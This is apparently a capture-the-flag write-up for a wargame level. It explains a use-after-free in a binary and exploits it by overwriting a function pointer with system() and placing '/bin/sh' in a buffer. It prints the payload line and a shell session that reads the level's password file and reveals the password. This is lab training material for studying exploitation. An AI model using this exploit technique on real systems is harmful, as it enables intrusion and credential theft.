After decompiling and analyzing the binary, we identify a Use-After-Free (UAF) vulnerability. The `struct construct` at index `0` is freed but still accessed by `update_construct` and `run_construct`.

The structure layout is defined as follows:

```c
struct construct {
    int count;               // Offset 0x00 (4 bytes)
    int flag;                // Offset 0x04 (4 bytes)
    char buff1[32];          // Offset 0x08 (32 bytes / 0x20)
    char buff2[64];          // Offset 0x28 (64 bytes / 0x40)
    execute_fn_t execute;    // Offset 0x68 (8-byte function pointer)
};                           // Total size = 112 bytes (0x70)

```

Using `update_construct` on the freed chunk, we can write directly into `buff2` (offset `0x28`) and overwrite the adjacent `execute` function pointer at offset `0x68`.

When `run_construct` calls `construct->execute(construct->buff2)`, the pointer to `buff2` is placed into the `RDI` register as the first argument. By writing `/bin/sh\x00` at the start of `buff2` and overwriting the `execute` function pointer with `system()`, invoking the construct spawns a shell:

* **Offset `0x00` - `0x07` (`buff2` start):** `b"/bin/sh\x00"`
* **Offset `0x08` - `0x3F` (padding):** 56 bytes of dummy data to reach 64 bytes
* **Offset `0x40` (offset `0x68` in struct):** `p64(system_address)`

```python
payload = b"/bin/sh\x00" + b"A" * 56 + p64(system_addr)

```

result:

```sh
bonus02@rainfall:~$ echo "" > exploit.py && vim exploit.py && python3 exploit.py
[+] Starting local process '/home/bonus02/flatline': pid 1270
[*] Switching to interactive mode
[FLATLINE] Construct 0 updated.
$ ls
exploit.py  flatline
$ whoami
flagbonus02
$ cat /home/$(whoami)/.pass
l2asy8pwncmqtbwfsu12w1hfv3yf6c30

```